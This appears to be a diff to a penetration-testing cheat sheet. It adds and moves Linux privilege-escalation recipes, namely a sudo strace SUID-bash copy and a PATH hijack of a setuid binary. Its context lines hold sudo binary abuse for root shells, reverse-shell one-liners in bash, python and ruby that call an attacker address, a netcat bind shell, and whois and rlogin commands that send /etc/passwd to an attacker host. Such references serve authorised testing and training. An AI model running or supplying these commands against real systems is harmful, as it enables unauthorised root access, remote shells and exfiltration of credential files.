@@ -617,17 +617,44 @@ smb: \> get <file>
 
 # Privilege Escalation
 
+- sudoers
+sudo -l                                                    Users that can run specific binaries with root permissions
+
+User www-data may run the following commands on winxp:
+     (root) NOPASSWD: /usr/bin/strace
+
+sudo /usr/bin/strace cp /bin/bash /tmp/foo                 Make a copy of bash
+sudo /usr/bin/strace chmod 4755 /tmp/foo                   Assign a SUID bit
+/tmp/foo -p                                                Run with -p to maintain the SUID privileges
+id                                                         You should now have a uid of 0 (root)
+
+- Groups
+id
+uid=1000(lee) gid=1000(lee) groups=1000(lee),1001(demo)    The user is part of the demo group
+find / -group demo 2>/dev/null                             Search for binaries in that group
+ls -la /usr/bin/demo                                       Check the privileges, look for root
+file /usr/bin/demo                                         Check for the file type, look for setuid
+
+Example: the binary is using the cat command.
+cd /tmp/
+echo '/bin/sh' > cat
+chmod 755 cat                                              Set execute privileges
+export PATH=/tmp:$PATH                                     Add the /tmp directory to the PATH environmental variable
+echo $PATH                                                 Check that the directory has been added
+demo                                                       Execute the binary
+id                                                         You should now have a uid of 0 (root)
+
 - Enumeration
-cat /etc/sysconfig/network                      Hostname and domain name
-ifconfig                                        IP addresses to all network interfaces
-route                                           Gateway
-cat /etc/resolv.conf                            DNS
-netstat -antp                                   Show ports that are listening
+cat /etc/sysconfig/network                                 Hostname and domain name
+ifconfig                                                   IP addresses to all network interfaces
+route                                                      Gateway
+cat /etc/resolv.conf                                       DNS
+netstat -antp                                              Show ports that are listening
 arp -e
-cat /etc/issue                                  OS info
-cat /proc/version                               OS name
-uname -a                                        Kernel info
-cat /sys/class/dmi/id/product_name              Computer model
+cat /etc/issue                                             OS info
+cat /proc/version                                          OS name
+uname -a                                                   Kernel info
+cat /sys/class/dmi/id/product_name                         Computer model
 cat /etc/exports
 
 - Search for exploits
@@ -658,17 +685,6 @@ wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/li
 wget https://raw.githubusercontent.com/portcullislabs/enum4linux/master/enum4linux.pl
 wget https://downloads.cisofy.com/lynis/lynis-3.0.4.tar.gz     cd lynis; ./lynis audit system
 
-- sudoers
-sudo -l                                                    Users that can run specific binaries with root permissions
-
-User www-data may run the following commands on winxp:
-     (root) NOPASSWD: /usr/bin/strace
-
-sudo /usr/bin/strace cp /bin/bash /tmp/backdoor            Make a copy of bash
-sudo /usr/bin/strace chmod 4755 /tmp/backdoor              Assign it a SUID bit
-/tmp/backdoor -p                                           Run with -p to maintain the SUID privileges
-id                                                         You should now have a uid of 0 (root)
-
 - Abusing binaries
 sudo apache2 -f /etc/shadow                                A way to view a system file
 sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash -i"
@@ -681,7 +697,7 @@ sudo find /home -exec /bin/bash \;
 sudo git help add                                          !/bin/sh then hit enter
 touch tmp
 find tmp -exec whoami \;                                   Find a file then execute a command
-find tmp -exec netcat -lvp 443 -e /bin/sh \;
+find tmp -exec netcat -lvnp 443 -e /bin/sh \;
 
 sudo ftp
 ! /bin/bash
@@ -718,8 +734,8 @@ except:
     sys.exit()
 
 - Cron jobs
-crontab -l                                      Check for entries
-ls -l /etc/cron*                                Scheduled cron jobs
+crontab -l                                                 Check for entries
+ls -l /etc/cron*                                           Scheduled cron jobs
 
 What files are owned by a particular user, but are not present in their home directory?
 What are the files present in the /home/user folder? Are there any hidden files and folders?
@@ -736,7 +752,7 @@ find / -perm 4000 2>/dev/null
 # Reverse Shells
 
 - Setup a local listener
-nc -lvnp 443			                       Setup a listen on the attack box
+nc -lvnp 443			                                  Setup a listen on the attack box
 
 - Bash shell
 bash -i >& /dev/tcp/10.0.0.10/443 0>&1
@@ -768,9 +784,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 - xterm
-xterm -display 10.0.0.10:1                      target - it will connect back to you on TCP port 6001
-Xnest :1                                        attacker - catch the incoming xterm, start an X-Server
-xhost +<target IP>                              attacker - authorize the target to connect to you
+xterm -display 10.0.0.10:1                                 target - it will connect back to you on TCP port 6001
+Xnest :1                                                   attacker - catch the incoming xterm, start an X-Server
+xhost +<target IP>                                         attacker - authorize the target to connect to you
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Rstatd Enabled
@@ -780,25 +796,25 @@ rsysinfo <target IP>
 
 # Upgrade to a full TTY session
 
-awk                                             awk 'BEGIN {system("/bin/bash")}'
-find                                            find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
-Lua                                             os.execute('/bin/sh')
-nmap                                            !sh
-nmap                                            --interactive
-Perl                                            perl —e 'exec "/bin/bash";'
-Perl                                            exec "/bin/sh";
-Python                                          python -c 'import pty; pty.spawn("/bin/bash")'
-Ruby                                            exec "/bin/sh"
-sh                                              /bin/bash
-Within IRB                                      exec "/bin/sh"
-Within vi                                       :!bash
-Within vi                                       :set shell=/bin/bash:shell
+awk                                                        awk 'BEGIN {system("/bin/bash")}'
+find                                                       find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+Lua                                                        os.execute('/bin/sh')
+nmap                                                       !sh
+nmap                                                       --interactive
+Perl                                                       perl —e 'exec "/bin/bash";'
+Perl                                                       exec "/bin/sh";
+Python                                                     python3 -c 'import pty;pty.spawn("/bin/bash")'
+Ruby                                                       exec "/bin/sh"
+sh                                                         /bin/bash
+Within IRB                                                 exec "/bin/sh"
+Within vi                                                  :!bash
+Within vi                                                  :set shell=/bin/bash:shell
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # whois Data Exfil
 
-nc -lvnp 43 | sed "s/ //g" | base64 -d                      Attacker
-whois -h <attacker IP> -p 43 `cat /etc/passwd | base64`     Target
+nc -lvnp 43 | sed "s/ //g" | base64 -d                     Attacker
+whois -h <attacker IP> -p 43 `cat /etc/passwd | base64`    Target
 
 - additional method
 rlogin -l "$(cat /etc/passwd)" -p port <target IP>
